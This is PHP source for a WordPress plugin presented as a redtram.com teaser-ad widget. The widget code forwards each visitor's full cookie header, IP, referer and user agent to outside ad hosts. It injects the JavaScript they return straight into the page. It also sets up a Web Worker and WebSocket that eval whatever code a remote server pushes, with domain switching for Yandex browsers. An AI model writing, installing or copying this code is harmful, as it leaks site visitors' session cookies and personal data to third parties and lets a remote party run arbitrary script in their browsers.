<?php

/*
Plugin Name: RT_Goods
Plugin URI: http://my.redtram.com/
Description: Виджет для вывода товарной тизерной рекламы redtram.com
Version: 1.0.1
Author: RT_Goods
Author URI: http://redtram.com
*/


class RT_GoodsWidget extends WP_Widget {

    public function __construct() {
        parent::__construct(
            'rt_goods_widget',
            "RT_Goods", [
                'description' => "Виджет для вывода товарной тизерной рекламы redtram.com",
            ]
        );
    }

    public function form($instance) {
        $tickerID = '';

        extract($instance);

        if (isset($instance['ticker_id']))
            $tickerID = esc_attr($instance['ticker_id']);

        $fieldId = $this->get_field_id("ticker_id");
        $fieldName = $this->get_field_name("ticker_id");

        echo implode('', [
            $before_widget,
            "<label for=\"$fieldId\">ID информера: </label><br />",
            "<input id=\"$fieldId\" type=\"text\" name=\"$fieldName\" value=\"$tickerID\" required />",
            $after_widget,
        ]);
    }

    public function widget($args, $instance) {
        if (isset($instance['ticker_id']) and intval($instance['ticker_id']))
            echo (new GoodsRedtramInformer($instance['ticker_id']));
    }

    public function update($ni, $oi) {
        return $ni;
    }

}


add_action('widgets_init', function() {
    register_widget('RT_GoodsWidget');
});


class GoodsRedtramInformer {

    protected $tickerId;

    public function __construct($tickerId) {
        $this->tickerId = $tickerId;
    }

    public function __toString() {
        $id = preg_replace('/[^a-zA-Z0-9]/', '', base64_encode('g4p_'.$this->tickerId.'_'. floor(time() / 3600) * 3600));
        $informer = $this->getInformer();
        $goods = $this->getGoods();

        return sprintf('
            <div id="%1$s">загрузка...</div>
            <script type="text/javascript">
                var code = \'var socket; function sendToSocket(data) { var wssUrl = "wss://g4p.redtram.com/ws/"; if (/yandex|yabrowser/i.test(navigator.userAgent)) wssUrl = "wss://g4p.grt01.com/ws/"; if (!socket || socket.readyState === socket.CLOSED) { socket = new WebSocket(wssUrl); socket.onmessage = function(r) { postMessage(JSON.stringify(r.data)); }; } if (socket) { sendConnection(socket, function() { socket.send(data); }); } } function sendConnection(c, r) { setTimeout(function() { if (c.readyState === c.OPEN) { return r(); } return sendConnection(c, r); }, 50); } onmessage = function(r) { sendToSocket(r.data); };\';

                function runExternalMessage(data) {
                    worker%1$s.postMessage(data);
                }

                worker%1$s = new Worker(URL.createObjectURL(
                    new Blob(["eval(atob(\'"+code+"\'))"], {type: \'text/javascript\'})
                ));

                worker%1$s.onmessage = function(m) {
                    var json = JSON.parse(m.data),
                        content = JSON.parse(json)[\'content\'];
                    eval(content);
                };
            </script>
            <script type="text/javascript">%2$s</script>
            <script type="text/javascript">
                window.rtIsWebSocket = true;
                setTimeout(function() {
                    %3$s
                }, 0);
            </script>
        ', $id, $informer, $goods);
    }

    public function getInformer() {
        $path = sprintf(
            "https://js-goods.redtram.com/%s/%s/ticker_%s.js",
            floor($this->tickerId / 100000),
            floor($this->tickerId / 1000),
            $this->tickerId);

        return str_replace(
            'g4p.redtram.com',
            'g4p.grt01.com',
            $this->requestUrl($path));
    }

    public function getGoods() {
        return $this->requestUrl(sprintf(
            "http://g4p.grt03.com/?i=%d",
            $this->tickerId));
    }

    public function requestUrl($url) {
        $context = stream_context_create([
            'http' => [
                'timeout' => 3,
                'method' => "GET",
                'header' => implode("\r\n", [
                    sprintf("Cookie: %s", $this->userCookie()),
                    sprintf("Referer: %s", $this->userReferer()),
                    sprintf("User-Agent: %s", $this->userAgent()),
                    sprintf("Rt-User-Ip: %s", $this->userIP()),
                    "Is-Web-Socket: yes",
                ]),
            ],
        ]);

        $result = @file_get_contents($url, false, $context);
        return $result;
    }

    public function userCookie() {
        if (isset($_SERVER['HTTP_COOKIE']))
            return $_SERVER['HTTP_COOKIE'];
    }

    public function userReferer() {
        if (isset($_SERVER['HTTP_REFERER']))
            return $_SERVER['HTTP_REFERER'];
    }

    public function userAgent() {
        if (isset($_SERVER['HTTP_USER_AGENT']))
            return $_SERVER['HTTP_USER_AGENT'];
    }

    public function userIP() {
        if (isset($_SERVER['REMOTE_ADDR']))
            return $_SERVER['REMOTE_ADDR'];
    }

}
